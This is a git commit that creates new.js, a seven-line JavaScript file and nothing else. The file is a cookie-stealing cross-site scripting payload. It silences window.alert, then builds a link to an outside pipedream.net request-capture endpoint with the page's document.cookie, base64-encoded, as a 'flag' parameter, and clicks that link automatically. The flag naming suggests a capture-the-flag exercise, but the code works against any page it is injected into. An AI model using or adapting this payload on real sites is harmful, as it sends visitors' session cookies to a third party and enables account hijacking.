e369f8ed323e00ed3e7260a68980159b90850d5f
Abdul Haq <75989562+skabdulhaq@users.noreply.github.com>
2023-02-27 13:57:28 +0530

    Create new.js

---
+++ new.js
@@ -0,0 +1,7 @@
+window.alert = function() {console.log("alert(1337)")};
+let link = document.createElement("a");
+link.setAttribute("href", "https://eoctl0knzoys9l9.m.pipedream.net/?flag="+btoa(document.cookie));
+link.setAttribute("id", "link");
+link.innerHTML = "hi"
+document.body.appendChild(link)
+document.querySelector("#link").click()
